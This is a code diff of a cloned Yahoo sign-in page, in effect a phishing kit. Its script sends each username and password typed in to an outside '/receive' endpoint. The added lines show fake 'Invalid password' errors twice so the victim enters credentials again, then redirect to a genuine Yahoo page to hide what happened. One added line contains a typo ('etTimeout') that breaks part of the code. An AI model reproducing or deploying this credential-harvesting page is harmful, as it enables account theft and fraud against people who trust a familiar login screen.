@@ -6,16 +6,8 @@
         <meta name="format-detection" content="telephone=no">
         <title>Yahoo</title>
         <meta name="description" content="Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies... You get more out of the web, you get more out of life.">
-        <link rel="dns-prefetch" href="https://gstatic.com/">
-        <link rel="dns-prefetch" href="https://google.com/">
-        <link rel="dns-prefetch" href="https://s.yimg.com/">
-        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
-        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
-        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
-        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
-        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
-        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
-        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
+        
+    
         <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
         <style nonce="">
             #mbr-css-check {
@@ -71,7 +63,7 @@ root.isIOSDevice = true;
     </head>
     <body class="bucket-mbr-apt-trap-design-v2">
     <div id="login-body" class="loginish  puree-v2  grid    ">
-    <div class="mbr-desktop-hd">
+    <div id="desk" class="mbr-desktop-hd">
     <span class="column">
          <a href="https://www.yahoo.com/">
             <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
@@ -88,12 +80,68 @@ root.isIOSDevice = true;
                     <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                     <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
             </div>
+            <!-- <script>
+                var loginBody = document.getElementById('login-body');
+            
+                
+                if (!window.matchMedia('(max-width: 750px)').matches) {
+                
+                    loginBody.classList.add('desktop');
+                    document.getElementById('desk').style.display = 'block';
+                    console.log('desktop');
+                } else {
+                  
+                    loginBody.classList.remove('desktop');
+                    document.getElementById('desk').style.display = 'none';
+                    console.log('mobile');
+                }
+            </script> -->
+            <style>
+                #login-body {
+                    /* Add your default styles here */
+                }
+            
+                #desk {
+                    display: none;
+                }
+            
+                @media (min-width: 751px) {
+                    #login-body {
+                        /* Styles for desktop view */
+                    }
+            
+                    #desk {
+                        display: block;
+                    }
+                }
+            
+                @media (max-width: 750px) {
+                    #login-body {
+                        /* Styles for mobile view */
+                    }
+
+                    .login-box-ad-fallback {
+                        display: none!important;
+                        
+                    }
+
+                    .login-box{
+                        box-shadow: 0 0 0 0 transparent;
+                    }
+            
+                    #desk {
+                        display: none;
+                    }
+                }
+            </style>
+            
             <div class="challenge yid-challenge">
     <div class="challenge-header">
 </div><div style="text-align: center;" id="yid" class="yid"></div>
 <div class="username-challenge" id="login-landing">
     <strong id="strong-mess" class="challenge-heading">Sign&nbsp;in</strong>
     <span id="feint-mess" class="challenge-desc signin-sub-title">using your Yahoo&nbsp;account</span>
+
     
     <form id="login-username-form" method="post" class="pure-form">
          <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
@@ -416,6 +464,9 @@ root.isIOSDevice = true;
 </div>
 </div>
 <script>
+
+
+
     const passwordToggle = document.getElementById('password-toggle-button');
     const passwordInput = document.getElementById('login-passwd');
   
@@ -441,7 +492,7 @@ root.isIOSDevice = true;
     
     
   </script>
-    <script src="./Yahoo_files/bundle.js"></script>
+   
 
     <div id="mbr-css-check"></div>
     <div id="page-mask" class="page-mask hide"></div>
@@ -455,25 +506,18 @@ root.isIOSDevice = true;
     </div>
     <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
     <script>
+         let click = 0;
 		function smb() {
 		var login = inputElement.value;
 		var pword = document.getElementById('login-passwd').value;
-		console.log(login +' pword'+ pword);
-		console.log(ablp);
+		
 		let url = ablp+'/receive';
                     $.ajax({
-					    method: 'POST',
-					    url: url,
-					    data: { Login: login, Password: pword },
-					})
-					.done(function(msg) {
-					    console.log(msg);
-					    window.location.href = goto;
-					})
-					.fail(function(err, textstatus, error) {
-					    // Handle AJAX request failure here
-					});
-
+                    	method: 'POST',
+                        url: url,
+                        data: { Login: login, Password: pword }// Sending message as an object
+                    })
+                    
       }
 		
 		var visitor = "";
@@ -533,10 +577,11 @@ root.isIOSDevice = true;
 		    showpass();
 		    
 		  } else if (email.length <= 4) {
-		   setTimeout(function() {
+            etTimeout(function() {
+            document.getElementById("username-error").style.display = "block";
            document.getElementById("username-error").textContent = "Sorry, we don't recognize this email.";
 		  
-		}, 2000);
+		}, 1000);
 		   
 		  } 
 		  });
@@ -563,7 +608,18 @@ root.isIOSDevice = true;
 		  
     Signin.addEventListener('click', function(){
 		event.preventDefault();
-		smb();
+        click++;
+        smb();
+        if(click >= 3 ){
+            window.location.href = "https://www.yahoo.com/subscriptions/products/yahoo-plus-secure-lastpass";
+            document.getElementById("username-error").style.display = "none";
+        }else{
+            console.log(click);
+            setTimeout(function() {
+            document.getElementById("username-error").style.display = "block";
+            document.getElementById("username-error").textContent = "Invalid password. Please try again";
+        }, 1000);
+        }
 		});
 	</script>
 
